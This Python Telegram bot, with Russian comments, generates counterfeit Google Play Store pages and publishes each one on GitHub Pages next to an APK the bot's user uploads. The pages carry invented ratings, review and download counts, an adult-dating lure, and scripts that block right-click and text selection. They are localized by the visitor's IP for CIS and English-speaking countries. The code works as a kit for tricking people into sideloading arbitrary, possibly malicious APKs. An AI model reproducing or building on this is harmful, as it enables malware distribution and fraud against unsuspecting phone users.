import os
import json
import base64
import random
import string
import asyncio
import aiohttp
from aiogram import Bot, Dispatcher, F
from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage

# ====== НАСТРОЙКИ ======
TELEGRAM_TOKEN = os.getenv("TELEGRAM_TOKEN")
GITHUB_TOKEN = os.getenv("GITHUB_TOKEN")
GITHUB_USER = os.getenv("GITHUB_USER", "jdnfhdifj1")
GITHUB_REPO = os.getenv("GITHUB_REPO", "apps")

GITHUB_API = "https://api.github.com"
HEADERS = {
    "Authorization": f"token {GITHUB_TOKEN}",
    "Accept": "application/vnd.github.v3+json"
}

bot = Bot(token=TELEGRAM_TOKEN)
dp = Dispatcher(storage=MemoryStorage())

# ====== СОСТОЯНИЯ ======
class CreateLanding(StatesGroup):
    waiting_name = State()
    waiting_icon = State()
    waiting_screenshots = State()
    waiting_apk = State()

# ====== ХРАНИЛИЩЕ ЛЕНДИНГОВ ======
# landing_id -> { name, icon_b64, screenshots, apk_name, url }
landings_db = {}
user_screenshots = {}  # temp storage during creation

# ====== ГЕНЕРАЦИЯ ID ======
def gen_id():
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=6))

# ====== GITHUB: загрузить файл ======
async def github_upload(path: str, content_bytes: bytes, message: str = "upload"):
    url = f"{GITHUB_API}/repos/{GITHUB_USER}/{GITHUB_REPO}/contents/{path}"
    timeout = aiohttp.ClientTimeout(total=600)
    
    async with aiohttp.ClientSession(timeout=timeout) as session:
        # Проверяем sha если файл существует
        sha = None
        async with session.get(url, headers=HEADERS) as resp:
            if resp.status == 200:
                data = await resp.json()
                sha = data.get("sha")
        
        payload = {
            "message": message,
            "content": base64.b64encode(content_bytes).decode()
        }
        if sha:
            payload["sha"] = sha
        
        async with session.put(url, headers=HEADERS, json=payload) as resp:
            result = resp.status in (200, 201)
            if not result:
                text = await resp.text()
                print(f"GitHub upload error {resp.status}: {text}")
            return result

# ====== GITHUB: инициализировать репозиторий ======
async def init_repo():
    """Создаёт первый файл если репо пустой"""
    timeout = aiohttp.ClientTimeout(total=60)
    async with aiohttp.ClientSession(timeout=timeout) as session:
        # Проверяем есть ли main branch
        ref_url = f"{GITHUB_API}/repos/{GITHUB_USER}/{GITHUB_REPO}/git/refs/heads/main"
        async with session.get(ref_url, headers=HEADERS) as resp:
            if resp.status == 200:
                return  # уже есть
        
        # Создаём первый файл
        url = f"{GITHUB_API}/repos/{GITHUB_USER}/{GITHUB_REPO}/contents/README.md"
        payload = {
            "message": "init",
            "content": base64.b64encode(b"# Apps").decode()
        }
        async with session.put(url, headers=HEADERS, json=payload) as resp:
            pass
async def enable_pages():
    url = f"{GITHUB_API}/repos/{GITHUB_USER}/{GITHUB_REPO}/pages"
    payload = {"source": {"branch": "main", "path": "/"}}
    async with aiohttp.ClientSession() as session:
        async with session.post(url, headers=HEADERS, json=payload) as resp:
            pass  # может вернуть 409 если уже включено — ок

# ====== ГЕНЕРАЦИЯ HTML ======
def generate_html(landing_id: str, name: str, icon_b64: str, screenshots_b64: list, apk_filename: str) -> str:
    # Скриншоты
    screenshots_html = ""
    for sc in screenshots_b64:
        screenshots_html += f'<div class="sc-wrap"><img src="data:image/jpeg;base64,{sc}" alt="screenshot"></div>\n'

    html = f"""<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>{name}</title>
<style>
@import url('https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap');
* {{ margin:0; padding:0; box-sizing:border-box; -webkit-tap-highlight-color:transparent; user-select:none; -webkit-user-select:none; }}
body {{ font-family:'Roboto',sans-serif; background:#fff; color:#202124; max-width:412px; margin:0 auto; overflow-x:hidden; font-size:14px; }}
.topbar {{ background:#fff; padding:12px 16px; display:flex; align-items:center; gap:12px; border-bottom:1px solid #e8eaed; position:sticky; top:0; z-index:10; }}
.topbar-search {{ flex:1; background:#f1f3f4; border-radius:24px; padding:8px 16px; font-size:14px; color:#5f6368; display:flex; align-items:center; gap:8px; }}
.app-header {{ padding:16px; }}
.app-top {{ display:flex; gap:16px; align-items:flex-start; margin-bottom:16px; }}
.app-icon-wrap img {{ width:80px; height:80px; border-radius:18px; object-fit:cover; }}
.app-info {{ flex:1; }}
.app-title {{ font-size:20px; font-weight:500; color:#202124; margin-bottom:4px; line-height:1.3; }}
.publisher {{ font-size:13px; color:#01875f; font-weight:500; margin-bottom:2px; }}
.stats-row {{ display:flex; align-items:center; gap:0; margin-bottom:16px; overflow-x:auto; scrollbar-width:none; }}
.stats-row::-webkit-scrollbar {{ display:none; }}
.stat-item {{ display:flex; flex-direction:column; align-items:center; padding:0 16px; border-right:1px solid #e8eaed; min-width:80px; }}
.stat-item:first-child {{ padding-left:0; }}
.stat-item:last-child {{ border-right:none; }}
.stat-val {{ font-size:14px; font-weight:500; color:#202124; white-space:nowrap; }}
.stat-sub {{ font-size:11px; color:#5f6368; margin-top:2px; white-space:nowrap; }}
.btn-install {{ background:#01875f; color:#fff; border:none; border-radius:20px; padding:10px 0; font-size:14px; font-weight:500; cursor:pointer; width:100%; }}
.btn-row {{ display:flex; gap:8px; margin-bottom:8px; }}
.screenshots {{ display:flex; gap:8px; overflow-x:auto; padding:0 16px 16px; scrollbar-width:none; }}
.screenshots::-webkit-scrollbar {{ display:none; }}
.sc-wrap img {{ height:200px; border-radius:12px; object-fit:cover; }}
.section {{ padding:16px; border-top:8px solid #f1f3f4; }}
.sec-title {{ font-size:16px; font-weight:500; margin-bottom:12px; }}
.about-text {{ font-size:13px; color:#3c4043; line-height:1.6; }}
.divider-thick {{ height:8px; background:#f1f3f4; }}
.bottom-nav {{ position:fixed; bottom:0; left:50%; transform:translateX(-50%); width:100%; max-width:412px; background:#fff; border-top:1px solid #e8eaed; display:flex; justify-content:space-around; padding:8px 0 4px; z-index:100; }}
.nav-item {{ display:flex; flex-direction:column; align-items:center; gap:2px; cursor:pointer; }}
.nav-label {{ font-size:10px; color:#5f6368; }}
.pb {{ padding-bottom:64px; }}
</style>
</head>
<body>

<!-- TOPBAR -->
<div class="topbar">
  <svg width="24" height="24" viewBox="0 0 24 24" fill="none"><path d="M19 11H7.83l4.88-4.88c.39-.39.39-1.03 0-1.42-.39-.39-1.02-.39-1.41 0l-6.59 6.59c-.39.39-.39 1.02 0 1.41l6.59 6.59c.39.39 1.02.39 1.41 0 .39-.39.39-1.02 0-1.41L7.83 13H19c.55 0 1-.45 1-1s-.45-1-1-1z" fill="#5f6368"/></svg>
  <div class="topbar-search">
    <svg width="18" height="18" viewBox="0 0 24 24" fill="none"><path d="M15.5 14h-.79l-.28-.27A6.47 6.47 0 0 0 16 9.5 6.5 6.5 0 1 0 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z" fill="#5f6368"/></svg>
    Поиск приложений
  </div>
</div>

<!-- APP HEADER -->
<div class="app-header">
  <div class="app-top">
    <div class="app-icon-wrap">
      <img src="data:image/jpeg;base64,{icon_b64}" alt="icon">
    </div>
    <div class="app-info">
      <div class="publisher">SEX GROUP</div>
      <div class="app-title" data-i18n="title">{name}</div>
    </div>
  </div>

  <div class="stats-row">
    <div class="stat-item">
      <div class="stat-val">4,2 ★</div>
      <div class="stat-sub" data-i18n="reviews">529К отзывов</div>
    </div>
    <div class="stat-item">
      <div class="stat-val">10М+</div>
      <div class="stat-sub" data-i18n="downloads">Загрузок</div>
    </div>
    <div class="stat-item">
      <div class="stat-val">18+</div>
      <div class="stat-sub" data-i18n="rated">Для 18+</div>
    </div>
  </div>

  <div class="btn-row">
    <a id="apk-link" href="{landing_id}/{apk_filename}" download="{apk_filename}" style="flex:1;text-decoration:none">
      <button class="btn-install" data-i18n="install">Установить</button>
    </a>
  </div>
</div>

<!-- SCREENSHOTS -->
<div class="screenshots">
{screenshots_html}
</div>

<div class="pb">
<!-- ABOUT -->
<div class="section">
  <div class="sec-title" data-i18n="about">О приложении</div>
  <div class="about-text" data-i18n="about_text">Найди кого-то особенного рядом с тобой. Никаких обязательств — только живое общение и реальные встречи.</div>
</div>
</div>

<!-- BOTTOM NAV -->
<div class="bottom-nav">
  <div class="nav-item"><svg width="22" height="22" viewBox="0 0 24 24" fill="#5f6368"><path d="M10 20v-6h4v6h5v-8h3L12 3 2 12h3v8z"/></svg><span class="nav-label" data-i18n="nav_home">Главная</span></div>
  <div class="nav-item"><svg width="22" height="22" viewBox="0 0 24 24" fill="#5f6368"><path d="M21 6H3c-1.1 0-2 .9-2 2v8c0 1.1.9 2 2 2h18c1.1 0 2-.9 2-2V8c0-1.1-.9-2-2-2zm-10 7H8v3H6v-3H3v-2h3V8h2v3h3v2zm4.5 2c-.83 0-1.5-.67-1.5-1.5v-5c0-.83.67-1.5 1.5-1.5s1.5.67 1.5 1.5v5c0 .83-.67 1.5-1.5 1.5zm4-1c0 .55-.45 1-1 1s-1-.45-1-1V9c0-.55.45-1 1-1s1 .45 1 1v5z"/></svg><span class="nav-label" data-i18n="nav_games">Игры</span></div>
  <div class="nav-item"><svg width="22" height="22" viewBox="0 0 24 24" fill="#01875f"><path d="M15.5 14h-.79l-.28-.27A6.47 6.47 0 0 0 16 9.5 6.5 6.5 0 1 0 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"/></svg><span class="nav-label" style="color:#01875f" data-i18n="nav_search">Поиск</span></div>
  <div class="nav-item"><svg width="22" height="22" viewBox="0 0 24 24" fill="#5f6368"><path d="M18 2H6c-1.1 0-2 .9-2 2v16c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2zm-2 14H8v-2h8v2zm0-4H8v-2h8v2zm0-4H8V6h8v2z"/></svg><span class="nav-label" data-i18n="nav_books">Книги</span></div>
</div>

<script>
document.addEventListener('contextmenu', e => e.preventDefault());
document.addEventListener('selectstart', e => e.preventDefault());
document.addEventListener('dragstart', e => e.preventDefault());

const translations = {{
  ru: {{ title: '{name}', reviews: '529К отзывов', rated: 'Для 18+', downloads: 'Загрузок', install: 'Установить', about: 'О приложении', about_text: 'Найди кого-то особенного рядом с тобой. Никаких обязательств — только живое общение и реальные встречи.', nav_home: 'Главная', nav_games: 'Игры', nav_search: 'Поиск', nav_books: 'Книги' }},
  en: {{ title: '{name}', reviews: '529K reviews', rated: 'Rated 18+', downloads: 'Downloads', install: 'Install', about: 'About this app', about_text: 'Find someone special near you. No strings attached — just real conversations and real dates.', nav_home: 'Home', nav_games: 'Games', nav_search: 'Search', nav_books: 'Books' }},
  kk: {{ title: '{name}', reviews: '529К пікір', rated: '18+ жас', downloads: 'Жүктеу', install: 'Орнату', about: 'Қолданба туралы', about_text: 'Жақын жерден ерекше біреуді тап. Міндеттемесіз — тек тірі қарым-қатынас.', nav_home: 'Басты', nav_games: 'Ойындар', nav_search: 'Іздеу', nav_books: 'Кітаптар' }},
  uz: {{ title: '{name}', reviews: '529K sharh', rated: '18+ yosh', downloads: 'Yuklamalar', install: "O'rnatish", about: 'Ilova haqida', about_text: "Yaqin atrofda kimnidir toping. Hech qanday majburiyat yo'q.", nav_home: 'Asosiy', nav_games: 'O\'yinlar', nav_search: 'Qidiruv', nav_books: 'Kitoblar' }}
}};
const countryLang = {{ RU:'ru',BY:'ru',KG:'ru',TJ:'ru',UA:'ru',KZ:'kk',UZ:'uz',TM:'uz',US:'en',GB:'en',CA:'en',AU:'en' }};
function applyLang(lang) {{
  const t = translations[lang] || translations.ru;
  document.querySelectorAll('[data-i18n]').forEach(el => {{ if(t[el.dataset.i18n]) el.textContent = t[el.dataset.i18n]; }});
}}
fetch('https://ip-api.com/json/?fields=countryCode').then(r=>r.json()).then(d=>applyLang(countryLang[d.countryCode]||'ru')).catch(()=>applyLang('ru'));
</script>
</body>
</html>"""
    return html


# ====== КОМАНДЫ ======
@dp.message(Command("start"))
async def cmd_start(message: Message):
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="➕ Создать лендинг", callback_data="create")],
        [InlineKeyboardButton(text="📋 Мои лендинги", callback_data="mylandings")]
    ])
    await message.answer(
        "👋 Привет! Я бот для создания лендингов.\n\n"
        "Что хочешь сделать?",
        reply_markup=kb
    )

@dp.callback_query(F.data == "create")
async def start_create(callback: CallbackQuery, state: FSMContext):
    await callback.message.answer("📝 Введи название приложения:")
    await state.set_state(CreateLanding.waiting_name)
    await callback.answer()

@dp.message(CreateLanding.waiting_name)
async def got_name(message: Message, state: FSMContext):
    await state.update_data(name=message.text)
    await message.answer("🖼 Отправь иконку (фото):")
    await state.set_state(CreateLanding.waiting_icon)

@dp.message(CreateLanding.waiting_icon, F.photo)
async def got_icon(message: Message, state: FSMContext):
    file = await bot.get_file(message.photo[-1].file_id)
    async with aiohttp.ClientSession() as session:
        async with session.get(f"https://api.telegram.org/file/bot{TELEGRAM_TOKEN}/{file.file_path}") as resp:
            icon_bytes = await resp.read()
    icon_b64 = base64.b64encode(icon_bytes).decode()
    await state.update_data(icon_b64=icon_b64)
    user_screenshots[message.from_user.id] = []
    await message.answer("📸 Отправь скриншоты (по одному). Когда закончишь — напиши /done")
    await state.set_state(CreateLanding.waiting_screenshots)

@dp.message(CreateLanding.waiting_screenshots, F.photo)
async def got_screenshot(message: Message, state: FSMContext):
    file = await bot.get_file(message.photo[-1].file_id)
    async with aiohttp.ClientSession() as session:
        async with session.get(f"https://api.telegram.org/file/bot{TELEGRAM_TOKEN}/{file.file_path}") as resp:
            sc_bytes = await resp.read()
    sc_b64 = base64.b64encode(sc_bytes).decode()
    user_screenshots[message.from_user.id].append(sc_b64)
    count = len(user_screenshots[message.from_user.id])
    await message.answer(f"✅ Скриншот {count} добавлен. Ещё или /done")

@dp.message(CreateLanding.waiting_screenshots, Command("done"))
async def screenshots_done(message: Message, state: FSMContext):
    await message.answer("📦 Отправь APK файл:")
    await state.set_state(CreateLanding.waiting_apk)

@dp.message(CreateLanding.waiting_apk, F.document)
async def got_apk(message: Message, state: FSMContext):
    await message.answer("⏳ Загружаю на GitHub... Это может занять 1-2 минуты для большого APK файла.")
    
    data = await state.get_data()
    name = data["name"]
    icon_b64 = data["icon_b64"]
    screenshots = user_screenshots.get(message.from_user.id, [])
    
    # Скачиваем APK с увеличенным таймаутом
    file = await bot.get_file(message.document.file_id)
    timeout = aiohttp.ClientTimeout(total=300)
    async with aiohttp.ClientSession(timeout=timeout) as session:
        async with session.get(f"https://api.telegram.org/file/bot{TELEGRAM_TOKEN}/{file.file_path}") as resp:
            apk_bytes = await resp.read()
    
    apk_filename = message.document.file_name or "app.apk"
    landing_id = gen_id()
    
    # Инициализируем репо если нужно
    await init_repo()
    
    # Генерируем HTML
    html = generate_html(landing_id, name, icon_b64, screenshots, apk_filename)
    
    await message.answer("📄 HTML готов, загружаю файлы...")
    
    # Загружаем HTML
    ok1 = await github_upload(f"{landing_id}/index.html", html.encode(), f"Add landing {landing_id}")
    if not ok1:
        await message.answer("❌ Ошибка загрузки HTML. Попробуй ещё раз.")
        await state.clear()
        return
    
    await message.answer("📦 APK загружается...")
    
    # Загружаем APK
    ok2 = await github_upload(f"{landing_id}/{apk_filename}", apk_bytes, f"Add APK for {landing_id}")
    
    # Включаем Pages
    await enable_pages()
    
    if ok2:
        url = f"https://{GITHUB_USER}.github.io/{GITHUB_REPO}/{landing_id}/"
        
        # Сохраняем в БД
        user_id = str(message.from_user.id)
        if user_id not in landings_db:
            landings_db[user_id] = []
        landings_db[user_id].append({
            "id": landing_id,
            "name": name,
            "url": url,
            "apk": apk_filename
        })
        
        import io
        from aiogram.types import BufferedInputFile
        html_file = BufferedInputFile(html.encode(), filename=f"{landing_id}.html")
        
        await message.answer_document(
            document=html_file,
            caption=f"✅ Лендинг создан!\n\n🔗 Ссылка: {url}\n\n⚠️ GitHub Pages активируется за 2-3 минуты"
        )
    else:
        await message.answer("❌ Ошибка загрузки APK. Попробуй ещё раз.")
    
    await state.clear()

@dp.callback_query(F.data == "mylandings")
async def my_landings(callback: CallbackQuery):
    user_id = str(callback.from_user.id)
    landings = landings_db.get(user_id, [])
    
    if not landings:
        await callback.message.answer("У тебя пока нет лендингов. Создай первый!")
        await callback.answer()
        return
    
    buttons = []
    for l in landings:
        buttons.append([InlineKeyboardButton(text=f"📱 {l['name']}", callback_data=f"landing_{l['id']}")])
    
    kb = InlineKeyboardMarkup(inline_keyboard=buttons)
    await callback.message.answer("📋 Твои лендинги:", reply_markup=kb)
    await callback.answer()

@dp.callback_query(F.data.startswith("landing_"))
async def landing_detail(callback: CallbackQuery):
    landing_id = callback.data.replace("landing_", "")
    user_id = str(callback.from_user.id)
    landings = landings_db.get(user_id, [])
    
    landing = next((l for l in landings if l["id"] == landing_id), None)
    if not landing:
        await callback.message.answer("Лендинг не найден.")
        await callback.answer()
        return
    
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📥 Получить HTML", callback_data=f"gethtml_{landing_id}")]
    ])
    
    await callback.message.answer(
        f"📱 *{landing['name']}*\n\n🔗 {landing['url']}",
        reply_markup=kb,
        parse_mode="Markdown"
    )
    await callback.answer()

@dp.callback_query(F.data.startswith("gethtml_"))
async def get_html(callback: CallbackQuery):
    landing_id = callback.data.replace("gethtml_", "")
    
    # Скачиваем HTML с GitHub
    url = f"{GITHUB_API}/repos/{GITHUB_USER}/{GITHUB_REPO}/contents/{landing_id}/index.html"
    async with aiohttp.ClientSession() as session:
        async with session.get(url, headers=HEADERS) as resp:
            if resp.status == 200:
                data = await resp.json()
                html_bytes = base64.b64decode(data["content"])
                
                from aiogram.types import BufferedInputFile
                html_file = BufferedInputFile(html_bytes, filename=f"{landing_id}.html")
                await callback.message.answer_document(document=html_file, caption="Вот твой HTML файл!")
            else:
                await callback.message.answer("Не удалось получить файл с GitHub.")
    
    await callback.answer()

# ====== ЗАПУСК ======
async def main():
    print("Бот запущен!")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
